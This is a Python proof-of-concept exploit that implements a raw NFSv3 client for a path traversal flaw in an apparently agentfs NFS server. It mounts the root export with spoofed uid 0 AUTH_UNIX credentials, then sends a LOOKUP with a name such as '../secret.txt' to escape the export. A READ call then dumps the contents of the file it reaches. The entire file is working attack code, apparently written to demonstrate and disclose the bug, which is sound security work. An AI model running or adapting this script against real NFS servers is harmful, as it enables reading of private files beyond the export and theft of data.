#!/usr/bin/env python3
"""Minimal NFSv3 raw client - proves LOOKUP filename traversal in agentfs nfs."""
import struct, socket, sys, argparse

class X:
    def __init__(self): self.b = bytearray()
    def u32(self, v): self.b += struct.pack(">I", v); return self
    def u64(self, v): self.b += struct.pack(">Q", v); return self
    def op(self, data):
        self.u32(len(data)); self.b += data
        pad = (-len(data)) % 4
        self.b += b"\x00" * pad
        return self
    def s(self, st): return self.op(st.encode())

class R:
    def __init__(self, b): self.b, self.o = b, 0
    def u32(self):
        v = struct.unpack_from(">I", self.b, self.o)[0]; self.o += 4; return v
    def u64(self):
        v = struct.unpack_from(">Q", self.b, self.o)[0]; self.o += 8; return v
    def op(self):
        n = self.u32(); d = self.b[self.o:self.o+n]; self.o += n + ((-n) % 4); return d
    def attrs(self):
        if not self.u32(): return None
        a = {}
        a["type"]  = self.u32(); a["mode"] = self.u32(); a["nlink"] = self.u32()
        a["uid"]   = self.u32(); a["gid"]  = self.u32()
        a["size"]  = self.u64(); a["used"] = self.u64()
        self.u32(); self.u32()          # rdev
        a["fsid"]  = self.u64(); a["fileid"] = self.u64()
        for k in ("atime", "mtime", "ctime"):
            a[k] = self.u32(); self.u32()
        return a

def rpc(host, port, prog, vers, proc, body, uid=0, gid=0):
    xid = 0xC0FFEE01
    cred = X().u32(1).s("poc").u32(uid).u32(gid).u32(0)   # AUTH_UNIX, 0 aux gids
    c = X().u32(xid).u32(0).u32(2).u32(prog).u32(vers).u32(proc)
    c.u32(1).op(bytes(cred.b)).u32(0).op(b"")
    msg = bytes(c.b) + bytes(body.b)
    if HEXDUMP:
        print(f"[wire] prog={prog} proc={proc} len={len(msg)}")
        print(" ".join(f"{x:02x}" for x in msg[:160]) + (" ..." if len(msg) > 160 else ""))
    rec = struct.pack(">I", 0x80000000 | len(msg)) + msg
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(rec)
    hdr = s.recv(4)
    n = struct.unpack(">I", hdr)[0] & 0x7FFFFFFF
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk: break
        buf += chunk
    s.close()
    r = R(buf)
    assert r.u32() == xid
    assert r.u32() == 1, "not a reply"
    rs = r.u32()
    if rs != 0: raise SystemExit(f"RPC denied: reply_stat={rs}")
    r.u32(); r.op()          # verifier
    acc = r.u32()
    if acc != 0: raise SystemExit(f"accept_stat={acc}")
    return r

HEXDUMP = False

def main():
    global HEXDUMP
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=11111)
    ap.add_argument("--name", required=True, help="LOOKUP filename (e.g. ../secret.txt)")
    ap.add_argument("--read", type=int, default=512)
    ap.add_argument("--hexdump", action="store_true", help="dump request wire bytes")
    a = ap.parse_args()
    HEXDUMP = a.hexdump

    # MNT "/"
    r = rpc(a.host, a.port, 100005, 3, 1, X().s("/"))
    st = r.u32()
    if st != 0: raise SystemExit(f"MNT failed status={st}")
    root_fh = r.op()
    print(f"[+] mounted export /, root fh={root_fh.hex()}")

    # LOOKUP with traversal name
    body = X().op(root_fh).s(a.name)
    r = rpc(a.host, a.port, 100003, 3, 3, body)
    st = r.u32()
    if st != 0: raise SystemExit(f"LOOKUP {a.name!r} failed status={st}")
    fh = r.op(); obj = r.attrs(); r.attrs()
    print(f"[+] LOOKUP {a.name!r} -> fh={fh.hex()} size={obj['size'] if obj else '?'} mode={oct(obj['mode']) if obj else '?'}")

    # READ first bytes
    r = rpc(a.host, a.port, 100003, 3, 6, X().op(fh).u64(0).u32(a.read))
    st = r.u32()
    if st != 0: raise SystemExit(f"READ failed status={st}")
    r.attrs(); count = r.u32(); eof = r.u32(); data = r.op()
    print(f"[+] READ {count} bytes (eof={eof}):")
    sys.stdout.buffer.write(data); print()

if __name__ == "__main__":
    main()
